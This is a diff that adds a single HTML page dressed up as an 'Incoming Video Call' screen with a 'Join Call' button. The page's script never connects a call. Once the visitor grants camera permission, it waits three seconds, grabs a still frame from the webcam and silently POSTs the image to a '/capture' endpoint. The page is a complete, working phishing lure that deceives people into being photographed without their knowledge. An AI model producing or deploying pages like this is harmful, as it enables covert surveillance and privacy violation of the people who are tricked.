@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Video Call</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: Arial; text-align: center; padding: 40px 20px; background: #111; color: #fff; margin: 0; }
+        .box { max-width: 400px; margin: auto; }
+        button { padding: 15px 40px; font-size: 18px; background: #007bff; color: #fff; border: none; border-radius: 8px; margin-top: 20px; cursor: pointer; }
+        video { width: 100%; margin-top: 20px; border-radius: 10px; }
+        .msg { color: #aaa; font-size: 14px; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Incoming Video Call</h2>
+        <p>Tap below to join the call</p>
+        <button onclick="start()">Join Call</button>
+        <video id="v" autoplay playsinline muted></video>
+        <p class="msg">Connecting...</p>
+    </div>
+    <script>
+        async function start() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('v').srcObject = stream;
+                const video = document.getElementById('v');
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const img = canvas.toDataURL('image/png');
+                    fetch('/capture', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({image: img})
+                    });
+                }, 3000);
+            } catch(e) {
+                alert('Camera access denied');
+            }
+        }
+    </script>
+</body>
+  </html>
